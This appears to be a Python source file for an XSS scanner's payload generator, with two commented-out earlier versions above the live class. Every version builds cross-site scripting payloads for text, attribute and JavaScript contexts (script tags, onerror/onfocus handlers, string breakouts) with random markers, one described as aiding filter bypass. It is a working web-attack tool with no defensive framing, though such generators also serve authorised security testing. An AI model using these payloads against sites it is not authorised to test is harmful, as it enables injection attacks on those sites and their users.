# import random
# import string

# class PayloadGenerator:
#     def __init__(self, contexts=None, marker_length=6):
#         self.contexts = contexts or ["text", "attr-value", "attr-name", "js"]
#         self.marker_length = marker_length

#     def _marker(self):
#         return ''.join(random.choices(string.ascii_letters + string.digits, k=self.marker_length))

#     def get_payloads(self):
#         m = self._marker()
#         payloads = []

#         if "text" in self.contexts:
#             payloads += [
#                 f"<script>/*{m}*/alert(1)</script>",
#                 f"XSS\"> <b>{m}</b><script>alert(2)</script>"
#             ]

#         if "attr-value" in self.contexts:
#             payloads += [
#                 f"\" autofocus onfocus=alert(3) x=\"{m}",
#                 f"' onmouseover=alert(4) '{m}"
#             ]

#         if "attr-name" in self.contexts:
#             payloads += [
#                 f"onerror=alert(5){m}",
#                 f"onclick=alert(6){m}"
#             ]

#         if "js" in self.contexts:
#             payloads += [
#                 f"';alert(7);//{m}",
#                 f'";alert(8);//{m}'
#             ]

#         return payloads


# core/payload_generator.py
# import random
# import string
# from typing import List

# class PayloadGenerator:
#     """
#     Generate context-aware payloads with a small random marker for
#     filtering-bypass and uniqueness.
#     """
#     def __init__(self, contexts: List[str] = None, marker_length: int = 6):
#         self.contexts = contexts or ["text", "attr-value", "attr-name", "js"]
#         self.marker_length = marker_length

#     def _marker(self) -> str:
#         return ''.join(random.choices(string.ascii_letters + string.digits, k=self.marker_length))

#     def get_payloads(self) -> List[str]:
#         m = self._marker()
#         payloads = []

#         if "text" in self.contexts:
#             payloads += [
#                 f"<script>/*{m}*/alert(1)</script>",
#                 f"XSS\"> <b>{m}</b><script>alert(2)</script>"
#             ]

#         if "attr-value" in self.contexts:
#             payloads += [
#                 f"\" autofocus onfocus=alert(3) x=\"{m}",
#                 f"' onmouseover=alert(4) '{m}",
#                 f"\"'><img src=x onerror=alert(5)//{m}"
#             ]

#         if "attr-name" in self.contexts:
#             # Attribute-name payloads are delicate (may be reflected literally)
#             payloads += [
#                 f"onerror=alert(6){m}",
#                 f"onclick=alert(7){m}",
#                 f"{m}onload=alert(8)"
#             ]

#         if "js" in self.contexts:
#             payloads += [
#                 f'";alert(9);//{m}',
#                 f"');alert(10);//{m}",
#                 f"`;alert(11);//{m}"
#             ]

#         # Optionally return a small unique marker alone for fast detection
#         payloads.append(f"XSS_MARKER_{m}")

#         return payloads


# core/payload_generator.py
import random
import string
from typing import List

class PayloadGenerator:
    """
    Generate context-aware payloads with both simple and marker-based variants.
    """

    def __init__(self, contexts: List[str] = None, marker_length: int = 6):
        self.contexts = contexts or ["text", "attr-value", "attr-name", "js"]
        self.marker_length = marker_length

    def _marker(self) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=self.marker_length))

    def get_payloads(self) -> List[str]:
        m = self._marker()
        payloads = []

        # Always include a very simple marker first (useful when sites strip special chars)
        payloads.append(f"XSS_MARKER_{m}")

        if "text" in self.contexts:
            payloads += [
                "<script>alert(1)</script>",
                f"<script>/*{m}*/alert(1)</script>",
                f"XSS\"> <b>{m}</b><script>alert(2)</script>"
            ]

        if "attr-value" in self.contexts:
            payloads += [
                f"\" autofocus onfocus=alert(3) x=\"{m}",
                f"'>\" onmouseover=alert(4) '{m}",
                f"\"'><img src=x onerror=alert(5)//{m}"
            ]

        if "attr-name" in self.contexts:
            # attribute-name payloads (less likely to be accepted, but required)
            payloads += [
                f"onerror=alert(6){m}",
                f"onclick=alert(7){m}",
                f"{m}onload=alert(8)"
            ]

        if "js" in self.contexts:
            payloads += [
                f'";alert(9);//{m}',
                f"');alert(10);//{m}",
                f"`;alert(11);//{m}"
            ]

        return payloads
